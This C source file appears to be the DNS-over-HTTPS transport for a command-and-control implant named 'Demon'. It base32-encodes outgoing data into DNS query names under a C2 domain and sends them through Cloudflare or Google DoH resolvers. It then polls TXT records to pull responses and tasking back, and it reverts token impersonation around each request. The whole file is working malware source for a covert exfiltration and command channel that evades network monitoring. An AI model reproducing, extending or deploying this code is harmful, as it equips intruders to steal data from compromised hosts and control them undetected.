#include <Demon.h>

#include <core/TransportDoH.h>
#include <core/MiniStd.h>
#include <core/Token.h>

#ifdef TRANSPORT_DOH

/* ── RFC 4648 base32 (lowercase, no padding) ────────────────────────────── */

static const CHAR B32_ALPHABET[] = "abcdefghijklmnopqrstuvwxyz234567";

/*!
 * @brief Encode `SrcLen` bytes from `Src` into a lowercase base32 string.
 *
 * The caller must supply `Dst` with at least `(SrcLen * 8 + 4) / 5 + 1`
 * bytes (including the NUL terminator).
 *
 * @return Number of base32 characters written (excluding NUL).
 */
static SIZE_T B32Encode( const BYTE* Src, SIZE_T SrcLen, PCHAR Dst )
{
    UINT64 Buf  = 0;
    UINT32 Bits = 0;
    SIZE_T Out  = 0;

    for ( SIZE_T i = 0; i < SrcLen; i++ )
    {
        Buf = ( Buf << 8 ) | (UINT64) Src[ i ];
        Bits += 8;
        while ( Bits >= 5 )
        {
            Bits -= 5;
            Dst[ Out++ ] = B32_ALPHABET[ ( Buf >> Bits ) & 0x1F ];
        }
    }
    if ( Bits > 0 )
    {
        Dst[ Out++ ] = B32_ALPHABET[ ( Buf << ( 5 - Bits ) ) & 0x1F ];
    }
    Dst[ Out ] = '\0';
    return Out;
}

/*!
 * @brief Decode a lowercase base32 string into binary bytes.
 *
 * The caller must supply `Dst` with at least `StrLen * 5 / 8` bytes.
 *
 * @return Number of decoded bytes, or 0 on invalid input.
 */
static SIZE_T B32Decode( const CHAR* Src, SIZE_T StrLen, BYTE* Dst )
{
    UINT64 Buf  = 0;
    UINT32 Bits = 0;
    SIZE_T Out  = 0;

    for ( SIZE_T i = 0; i < StrLen; i++ )
    {
        CHAR ch = Src[ i ];
        UINT64 Val;
        if ( ch >= 'a' && ch <= 'z' )
            Val = (UINT64)( ch - 'a' );
        else if ( ch >= '2' && ch <= '7' )
            Val = (UINT64)( ch - '2' + 26 );
        else
            return 0; /* invalid character */

        Buf = ( Buf << 5 ) | Val;
        Bits += 5;
        if ( Bits >= 8 )
        {
            Bits -= 8;
            Dst[ Out++ ] = (BYTE)( Buf >> Bits );
            Buf &= ( (UINT64)1 << Bits ) - 1;
        }
    }
    return Out;
}

/* ── Session hex generation ─────────────────────────────────────────────── */

static const CHAR HexChars[] = "0123456789abcdef";

/*!
 * @brief Generate a 16-char lowercase hex session identifier.
 *
 * Uses 8 random bytes from RandomNumber32() to produce 16 hex characters.
 * `Dst` must hold at least 17 bytes (16 hex + NUL).
 */
static VOID GenerateSessionHex( CHAR Dst[ 17 ] )
{
    for ( DWORD i = 0; i < 4; i++ )
    {
        DWORD Rnd = RandomNumber32();
        Dst[ i * 4 + 0 ] = HexChars[ ( Rnd >> 28 ) & 0x0F ];
        Dst[ i * 4 + 1 ] = HexChars[ ( Rnd >> 24 ) & 0x0F ];
        Dst[ i * 4 + 2 ] = HexChars[ ( Rnd >> 20 ) & 0x0F ];
        Dst[ i * 4 + 3 ] = HexChars[ ( Rnd >> 16 ) & 0x0F ];
    }
    Dst[ 16 ] = '\0';
}

/* ── Hex formatting helpers ─────────────────────────────────────────────── */

/*!
 * @brief Write a 4-char zero-padded lowercase hex representation of `Val`
 *        into `Dst`.  `Dst` must hold at least 5 bytes.
 */
static VOID Hex04( DWORD Val, CHAR Dst[ 5 ] )
{
    Dst[ 0 ] = HexChars[ ( Val >> 12 ) & 0x0F ];
    Dst[ 1 ] = HexChars[ ( Val >>  8 ) & 0x0F ];
    Dst[ 2 ] = HexChars[ ( Val >>  4 ) & 0x0F ];
    Dst[ 3 ] = HexChars[ ( Val >>  0 ) & 0x0F ];
    Dst[ 4 ] = '\0';
}

/* ── Minimal JSON helpers ───────────────────────────────────────────────── */

/*!
 * @brief Find `"<Key>": <number>` in a JSON string and return the number.
 *
 * @return TRUE if found and parsed, FALSE otherwise.
 */
static BOOL JsonGetU64( const CHAR* Body, const CHAR* Key, UINT64* Out )
{
    /* Build the needle: "<Key>" */
    SIZE_T KeyLen = StringLengthA( Key );
    const CHAR* Pos = Body;

    for ( ;; )
    {
        /* Find the key name surrounded by double quotes */
        const CHAR* Quote = NULL;
        for ( const CHAR* p = Pos; *p; p++ )
        {
            if ( *p == '"' )
            {
                /* Check if key matches */
                BOOL Match = TRUE;
                for ( SIZE_T k = 0; k < KeyLen; k++ )
                {
                    if ( p[ 1 + k ] != Key[ k ] )
                    {
                        Match = FALSE;
                        break;
                    }
                }
                if ( Match && p[ 1 + KeyLen ] == '"' )
                {
                    Quote = p + 1 + KeyLen + 1; /* past closing quote */
                    break;
                }
            }
        }
        if ( !Quote )
            return FALSE;

        /* Skip whitespace and colon */
        while ( *Quote == ' ' || *Quote == '\t' || *Quote == '\n' || *Quote == '\r' )
            Quote++;
        if ( *Quote != ':' )
        {
            Pos = Quote;
            continue;
        }
        Quote++;
        while ( *Quote == ' ' || *Quote == '\t' || *Quote == '\n' || *Quote == '\r' )
            Quote++;

        /* Parse the number */
        UINT64 Val = 0;
        BOOL   Found = FALSE;
        while ( *Quote >= '0' && *Quote <= '9' )
        {
            Val = Val * 10 + ( *Quote - '0' );
            Quote++;
            Found = TRUE;
        }
        if ( Found )
        {
            *Out = Val;
            return TRUE;
        }
        Pos = Quote;
    }
}

/*!
 * @brief Extract the first TXT record `data` value from a DoH JSON response.
 *
 * Searches for `"type":16` (or `"type": 16`) and then extracts the `"data"`
 * string from the same JSON object.  Writes the unquoted result into `Dst`
 * (max `DstSize - 1` chars).
 *
 * @return TRUE if a TXT data value was found, FALSE otherwise.
 */
static BOOL JsonExtractTxtData( const CHAR* Body, PCHAR Dst, SIZE_T DstSize )
{
    /* Look for "type":16 or "type": 16 */
    const CHAR* Search = Body;
    const CHAR* TypePos = NULL;

    for ( ;; )
    {
        /* Try both with and without space after colon */
        const CHAR* p1 = NULL;
        const CHAR* p2 = NULL;

        for ( const CHAR* s = Search; *s; s++ )
        {
            if ( s[0] == '"' && s[1] == 't' && s[2] == 'y' && s[3] == 'p' &&
                 s[4] == 'e' && s[5] == '"' )
            {
                const CHAR* t = s + 6;
                while ( *t == ' ' || *t == '\t' ) t++;
                if ( *t == ':' )
                {
                    t++;
                    while ( *t == ' ' || *t == '\t' ) t++;
                    if ( t[0] == '1' && t[1] == '6' &&
                         ( t[2] < '0' || t[2] > '9' ) )
                    {
                        TypePos = s;
                        break;
                    }
                }
            }
        }

        if ( !TypePos )
            return FALSE;

        /* Find the enclosing '}' to limit our search */
        const CHAR* ObjEnd = TypePos;
        while ( *ObjEnd && *ObjEnd != '}' )
            ObjEnd++;

        /* Look for "data" within this object region */
        const CHAR* d = TypePos;
        while ( d < ObjEnd )
        {
            if ( d[0] == '"' && d[1] == 'd' && d[2] == 'a' && d[3] == 't' &&
                 d[4] == 'a' && d[5] == '"' )
            {
                const CHAR* v = d + 6;
                while ( *v == ' ' || *v == '\t' ) v++;
                if ( *v == ':' )
                {
                    v++;
                    while ( *v == ' ' || *v == '\t' ) v++;
                    if ( *v == '"' )
                    {
                        v++; /* past opening quote */
                        SIZE_T idx = 0;
                        while ( *v && *v != '"' && idx < DstSize - 1 )
                        {
                            if ( *v == '\\' && v[1] == '"' )
                            {
                                /* Escaped quote — Cloudflare wraps TXT data
                                 * in escaped quotes: "\"text\"".  Skip both
                                 * the backslash and the following '"' so the
                                 * '"' does not terminate the read loop early.
                                 * The outer escaped-quote pair acts as a
                                 * delimiter and is intentionally not copied. */
                                v++; /* skip backslash */
                                v++; /* skip the escaped '"' (delimiter, not content) */
                                continue;
                            }
                            Dst[ idx++ ] = *v;
                            v++;
                        }
                        Dst[ idx ] = '\0';
                        return TRUE;
                    }
                }
            }
            d++;
        }

        /* Advance past this type match and try again */
        Search = ObjEnd;
        if ( !*Search )
            return FALSE;
        TypePos = NULL;
    }
}

/* ── DNS query name building ────────────────────────────────────────────── */

/*!
 * @brief Build an ANSI query name for a DoH request.
 *
 * Format (uplink chunk):
 *   <base32_chunk>.<seq:04x><total:04x>.<session>.u.<c2_domain>
 *
 * `Dst` must be large enough to hold the full name (256 bytes is safe).
 *
 * @return Length of the resulting string.
 */
static SIZE_T BuildUplinkName(
    PCHAR       Dst,
    SIZE_T      DstSize,
    const CHAR* B32Chunk,
    DWORD       Seq,
    DWORD       Total,
    const CHAR* Session,
    const CHAR* C2Domain
)
{
    CHAR SeqHex[ 5 ];
    CHAR TotHex[ 5 ];
    Hex04( Seq, SeqHex );
    Hex04( Total, TotHex );

    /* Concatenate: chunk.seqtotal.session.u.domain */
    SIZE_T Off = 0;
    const CHAR* Src;

    Src = B32Chunk;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    for ( int i = 0; i < 4 && Off < DstSize - 1; i++ ) Dst[ Off++ ] = SeqHex[ i ];
    for ( int i = 0; i < 4 && Off < DstSize - 1; i++ ) Dst[ Off++ ] = TotHex[ i ];
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    Src = Session;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    if ( Off < DstSize - 1 ) Dst[ Off++ ] = 'u';
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    Src = C2Domain;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;

    Dst[ Off ] = '\0';
    return Off;
}

/*!
 * @brief Build a downlink ready-poll query name.
 *
 * Format: rdy.<session>.d.<c2_domain>
 */
static SIZE_T BuildReadyName(
    PCHAR       Dst,
    SIZE_T      DstSize,
    const CHAR* Session,
    const CHAR* C2Domain
)
{
    SIZE_T Off = 0;
    const CHAR* Src;

    Dst[ Off++ ] = 'r'; Dst[ Off++ ] = 'd'; Dst[ Off++ ] = 'y';
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    Src = Session;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    if ( Off < DstSize - 1 ) Dst[ Off++ ] = 'd';
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    Src = C2Domain;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;

    Dst[ Off ] = '\0';
    return Off;
}

/*!
 * @brief Build a downlink chunk-fetch query name.
 *
 * Format: <seq:04x>.<session>.d.<c2_domain>
 */
static SIZE_T BuildChunkFetchName(
    PCHAR       Dst,
    SIZE_T      DstSize,
    DWORD       Seq,
    const CHAR* Session,
    const CHAR* C2Domain
)
{
    SIZE_T Off = 0;
    CHAR SeqHex[ 5 ];
    const CHAR* Src;

    Hex04( Seq, SeqHex );
    for ( int i = 0; i < 4 && Off < DstSize - 1; i++ ) Dst[ Off++ ] = SeqHex[ i ];
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    Src = Session;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    if ( Off < DstSize - 1 ) Dst[ Off++ ] = 'd';
    if ( Off < DstSize - 1 ) Dst[ Off++ ] = '.';

    Src = C2Domain;
    while ( *Src && Off < DstSize - 1 ) Dst[ Off++ ] = *Src++;

    Dst[ Off ] = '\0';
    return Off;
}

/* ── DoH HTTPS query via WinHTTP ────────────────────────────────────────── */

/* DoH provider hostnames (wide strings for WinHttpConnect). */
static const WCHAR DohHostCloudflare[] = L"cloudflare-dns.com";
static const WCHAR DohHostGoogle[]     = L"dns.google";

/* DoH JSON API path with query parameters (built per-request). */

/*!
 * @brief Perform a single DoH JSON API TXT query via WinHTTP.
 *
 * Sends a GET request to the configured DoH provider with the query name
 * and parses the JSON response for the DNS status code and TXT record data.
 *
 * @param QueryName  DNS query name (ANSI).
 * @param Status     Output: DNS status code from the response.
 * @param TxtData    Output: first TXT record data (unquoted, ANSI).
 * @param TxtSize    Size of the TxtData buffer.
 * @return TRUE if the HTTP request succeeded and the response was parsed
 *         (even if DNS status is non-zero), FALSE on transport failure.
 */
static BOOL DoHTxtQuery(
    const CHAR* QueryName,
    UINT64*     Status,
    PCHAR       TxtData,
    SIZE_T      TxtSize
)
{
    HANDLE  hSession = NULL;
    HANDLE  hConnect = NULL;
    HANDLE  hRequest = NULL;
    BOOL    Success  = FALSE;
    PVOID   RespBuf  = NULL;
    SIZE_T  RespLen  = 0;
    DWORD   BufRead  = 0;
    UCHAR   Buffer[ 1024 ] = { 0 };

    const WCHAR* DohHost;
    DWORD        DohPort = INTERNET_DEFAULT_HTTPS_PORT;

    /* Select provider host */
    if ( Instance->Config.Transport.DoHProvider == DOH_PROVIDER_GOOGLE )
        DohHost = DohHostGoogle;
    else
        DohHost = DohHostCloudflare;

    /* Build the request path: /dns-query?name=<name>&type=TXT
     * We build it as a wide string for WinHttpOpenRequest. */
    CHAR  PathA[ 512 ] = { 0 };
    WCHAR PathW[ 512 ] = { 0 };
    SIZE_T PathOff = 0;

    {
        const CHAR* Prefix = "/dns-query?name=";
        while ( *Prefix && PathOff < sizeof( PathA ) - 1 )
            PathA[ PathOff++ ] = *Prefix++;

        const CHAR* n = QueryName;
        while ( *n && PathOff < sizeof( PathA ) - 1 )
            PathA[ PathOff++ ] = *n++;

        const CHAR* Suffix = "&type=TXT";
        while ( *Suffix && PathOff < sizeof( PathA ) - 1 )
            PathA[ PathOff++ ] = *Suffix++;

        PathA[ PathOff ] = '\0';
    }

    CharStringToWCharString( PathW, PathA, sizeof( PathW ) / sizeof( WCHAR ) );

    /* Revert impersonation for WinHTTP */
    TokenImpersonate( FALSE );

    /* Open WinHTTP session */
    WCHAR UserAgentW[] = ARCHON_WSTR(ARCHON_DOH_USER_AGENT);
    hSession = Instance->Win32.WinHttpOpen(
        UserAgentW,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if ( !hSession )
    {
        PRINTF_DONT_SEND( "DoH: WinHttpOpen failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    /* Connect to DoH provider */
    hConnect = Instance->Win32.WinHttpConnect( hSession, DohHost, DohPort, 0 );
    if ( !hConnect )
    {
        PRINTF_DONT_SEND( "DoH: WinHttpConnect failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    /* Open GET request */
    hRequest = Instance->Win32.WinHttpOpenRequest(
        hConnect,
        L"GET",
        PathW,
        NULL,
        NULL,
        NULL,
        WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE
    );
    if ( !hRequest )
    {
        PRINTF_DONT_SEND( "DoH: WinHttpOpenRequest failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    /* Add Accept header for DoH JSON API */
    Instance->Win32.WinHttpAddRequestHeaders(
        hRequest,
        L"Accept: application/dns-json",
        -1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
    );

    /* Send the request */
    if ( !Instance->Win32.WinHttpSendRequest( hRequest, NULL, 0, NULL, 0, 0, 0 ) )
    {
        PRINTF_DONT_SEND( "DoH: WinHttpSendRequest failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    if ( !Instance->Win32.WinHttpReceiveResponse( hRequest, NULL ) )
    {
        PRINTF_DONT_SEND( "DoH: WinHttpReceiveResponse failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    /* Read response body */
    RespBuf = NULL;
    RespLen = 0;

    do {
        BOOL ReadOk = Instance->Win32.WinHttpReadData( hRequest, Buffer, sizeof( Buffer ) - 1, &BufRead );
        if ( !ReadOk || BufRead == 0 )
            break;

        if ( !RespBuf )
            RespBuf = Instance->Win32.LocalAlloc( LPTR, BufRead + 1 );
        else
            RespBuf = Instance->Win32.LocalReAlloc( RespBuf, RespLen + BufRead + 1,
                                                     LMEM_MOVEABLE | LMEM_ZEROINIT );

        MemCopy( (PBYTE)RespBuf + RespLen, Buffer, BufRead );
        RespLen += BufRead;
        MemSet( Buffer, 0, sizeof( Buffer ) );
    } while ( TRUE );

    if ( !RespBuf || RespLen == 0 )
    {
        PUTS_DONT_SEND( "DoH: empty response body" )
        goto LEAVE;
    }

    /* NUL-terminate the JSON body */
    ( (PCHAR) RespBuf )[ RespLen ] = '\0';

    /* Parse DNS status */
    if ( !JsonGetU64( (PCHAR) RespBuf, "Status", Status ) )
    {
        PUTS_DONT_SEND( "DoH: missing Status in JSON response" )
        goto LEAVE;
    }

    /* Extract TXT data if Status == 0 (NOERROR) */
    if ( *Status == 0 && TxtData && TxtSize > 0 )
    {
        if ( !JsonExtractTxtData( (PCHAR) RespBuf, TxtData, TxtSize ) )
        {
            TxtData[ 0 ] = '\0';
        }
    }

    Success = TRUE;

LEAVE:
    if ( RespBuf )
        Instance->Win32.LocalFree( RespBuf );

    if ( hRequest )
        Instance->Win32.WinHttpCloseHandle( hRequest );

    if ( hConnect )
        Instance->Win32.WinHttpCloseHandle( hConnect );

    if ( hSession )
        Instance->Win32.WinHttpCloseHandle( hSession );

    TokenImpersonate( TRUE );

    return Success;
}

/* ── Main DoH send/receive ──────────────────────────────────────────────── */

BOOL DoHSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
)
{
    CHAR    Session[ 17 ]    = { 0 };
    CHAR    B32Buf[ DOH_CHUNK_B32_LEN + 1 ] = { 0 };
    CHAR    QueryName[ 256 ] = { 0 };
    CHAR    TxtData[ 256 ]   = { 0 };
    UINT64  DnsStatus        = 0;
    DWORD   TotalChunks      = 0;
    BOOL    Success          = FALSE;
    PVOID   RespBuffer       = NULL;
    SIZE_T  RespSize         = 0;
    PCHAR   C2Domain         = NULL;

    if ( !Send || !Send->Buffer || Send->Length == 0 )
        return FALSE;

    C2Domain = Instance->Config.Transport.DoHDomain;
    if ( !C2Domain )
    {
        PUTS_DONT_SEND( "DoH: no C2 domain configured" )
        return FALSE;
    }

    /* Generate per-request session identifier */
    GenerateSessionHex( Session );

    /* Calculate total chunks */
    TotalChunks = (DWORD)( ( Send->Length + DOH_CHUNK_BYTES - 1 ) / DOH_CHUNK_BYTES );
    if ( TotalChunks > DOH_MAX_CHUNKS )
    {
        PRINTF_DONT_SEND( "DoH: packet too large (%lu bytes, %lu chunks)\n",
                          (ULONG) Send->Length, (ULONG) TotalChunks )
        return FALSE;
    }

    PRINTF_DONT_SEND( "DoH: uplink %lu bytes in %lu chunks (session %s)\n",
                      (ULONG) Send->Length, (ULONG) TotalChunks, Session )

    /* ── Uplink: send each chunk as a DNS TXT query ────────────────────── */
    for ( DWORD Seq = 0; Seq < TotalChunks; Seq++ )
    {
        SIZE_T ChunkOff  = (SIZE_T) Seq * DOH_CHUNK_BYTES;
        SIZE_T ChunkLen  = Send->Length - ChunkOff;
        if ( ChunkLen > DOH_CHUNK_BYTES )
            ChunkLen = DOH_CHUNK_BYTES;

        /* Base32-encode this chunk */
        B32Encode( (const BYTE*)Send->Buffer + ChunkOff, ChunkLen, B32Buf );

        /* Build DNS query name */
        BuildUplinkName( QueryName, sizeof( QueryName ),
                         B32Buf, Seq, TotalChunks, Session, C2Domain );

        PRINTF_DONT_SEND( "DoH: uplink chunk %lu/%lu name=%s\n",
                          (ULONG) Seq, (ULONG) TotalChunks, QueryName )

        /* Send TXT query — NXDOMAIN (status 3) is expected and confirms
         * delivery.  Any other DNS error or HTTP failure is fatal. */
        DnsStatus = 0;
        if ( !DoHTxtQuery( QueryName, &DnsStatus, NULL, 0 ) )
        {
            /* HTTP transport failure — retry once */
            PRINTF_DONT_SEND( "DoH: uplink chunk %lu transport error, retrying\n", (ULONG) Seq )
            DnsStatus = 0;
            if ( !DoHTxtQuery( QueryName, &DnsStatus, NULL, 0 ) )
            {
                PRINTF_DONT_SEND( "DoH: uplink chunk %lu/%lu failed after retry\n",
                                  (ULONG) Seq, (ULONG) TotalChunks )
                return FALSE;
            }
        }

        /* NXDOMAIN (3) = chunk delivered.  NOERROR (0) = also fine.
         * SERVFAIL (2), REFUSED (5), etc. = resolver failure, abort. */
        if ( DnsStatus != 0 && DnsStatus != 3 )
        {
            PRINTF_DONT_SEND( "DoH: uplink chunk %lu DNS error status %llu\n",
                              (ULONG) Seq, (unsigned long long) DnsStatus )
            return FALSE;
        }
    }

    if ( !Resp )
    {
        /* Caller doesn't want a response (fire-and-forget). */
        return TRUE;
    }

    /* ── Downlink: poll for ready, then fetch response chunks ──────────── */

    /* Poll `rdy.<session>.d.<c2_domain>` with exponential backoff */
    DWORD DownlinkTotal = 0;
    {
        DWORD DelayMs = DOH_POLL_INIT_MS;

        BuildReadyName( QueryName, sizeof( QueryName ), Session, C2Domain );

        for ( DWORD Attempt = 0; Attempt < DOH_POLL_MAX_ATTEMPTS; Attempt++ )
        {
            PRINTF_DONT_SEND( "DoH: ready poll attempt %lu name=%s\n",
                              (ULONG) Attempt, QueryName )

            DnsStatus = 0;
            MemSet( (PBYTE) TxtData, 0, sizeof( TxtData ) );

            if ( DoHTxtQuery( QueryName, &DnsStatus, TxtData, sizeof( TxtData ) ) &&
                 DnsStatus == 0 && TxtData[ 0 ] != '\0' )
            {
                /* Parse hex total from TXT data */
                DWORD Parsed = 0;
                for ( SIZE_T i = 0; TxtData[ i ]; i++ )
                {
                    CHAR ch = TxtData[ i ];
                    DWORD v;
                    if ( ch >= '0' && ch <= '9' )      v = ch - '0';
                    else if ( ch >= 'a' && ch <= 'f' ) v = ch - 'a' + 10;
                    else if ( ch >= 'A' && ch <= 'F' ) v = ch - 'A' + 10;
                    else continue;
                    Parsed = ( Parsed << 4 ) | v;
                }
                DownlinkTotal = Parsed;
                PRINTF_DONT_SEND( "DoH: server ready, %lu response chunks\n",
                                  (ULONG) DownlinkTotal )
                break;
            }

            /* Sleep with backoff using a temporary waitable event */
            {
                HANDLE hEvent = NULL;
                Instance->Win32.NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 1, FALSE );
                if ( hEvent )
                {
                    LARGE_INTEGER Timeout;
                    Timeout.QuadPart = -( (LONGLONG) DelayMs * 10000 ); /* 100-ns units, negative = relative */
                    Instance->Win32.NtWaitForSingleObject( hEvent, FALSE, &Timeout );
                    Instance->Win32.NtClose( hEvent );
                }
            }

            DelayMs *= 2;
            if ( DelayMs > DOH_POLL_MAX_MS )
                DelayMs = DOH_POLL_MAX_MS;
        }

        if ( DownlinkTotal == 0 )
        {
            PUTS_DONT_SEND( "DoH: timed out waiting for response" )
            return FALSE;
        }
    }

    /* Fetch each downlink chunk */
    RespBuffer = NULL;
    RespSize   = 0;

    for ( DWORD Seq = 0; Seq < DownlinkTotal; Seq++ )
    {
        BuildChunkFetchName( QueryName, sizeof( QueryName ),
                             Seq, Session, C2Domain );

        PRINTF_DONT_SEND( "DoH: downlink chunk %lu/%lu name=%s\n",
                          (ULONG) Seq, (ULONG) DownlinkTotal, QueryName )

        DnsStatus = 0;
        MemSet( (PBYTE) TxtData, 0, sizeof( TxtData ) );

        if ( !DoHTxtQuery( QueryName, &DnsStatus, TxtData, sizeof( TxtData ) ) ||
             DnsStatus != 0 || TxtData[ 0 ] == '\0' )
        {
            PRINTF_DONT_SEND( "DoH: downlink chunk %lu failed (status=%llu)\n",
                              (ULONG) Seq, (unsigned long long) DnsStatus )
            if ( RespBuffer )
                Instance->Win32.LocalFree( RespBuffer );
            return FALSE;
        }

        /* Decode base32 TXT data */
        SIZE_T TxtLen = StringLengthA( TxtData );
        BYTE   DecodeBuf[ DOH_CHUNK_BYTES + 8 ] = { 0 };
        SIZE_T DecLen = B32Decode( TxtData, TxtLen, DecodeBuf );

        if ( DecLen == 0 )
        {
            PRINTF_DONT_SEND( "DoH: base32 decode failed for chunk %lu\n", (ULONG) Seq )
            if ( RespBuffer )
                Instance->Win32.LocalFree( RespBuffer );
            return FALSE;
        }

        /* Append to response buffer */
        if ( !RespBuffer )
            RespBuffer = Instance->Win32.LocalAlloc( LPTR, DecLen );
        else
            RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + DecLen,
                                                        LMEM_MOVEABLE | LMEM_ZEROINIT );

        MemCopy( (PBYTE) RespBuffer + RespSize, DecodeBuf, DecLen );
        RespSize += DecLen;
    }

    Resp->Buffer = RespBuffer;
    Resp->Length = RespSize;

    PRINTF_DONT_SEND( "DoH: downlink complete, %lu bytes\n", (ULONG) RespSize )

    return TRUE;
}

#endif /* TRANSPORT_DOH */
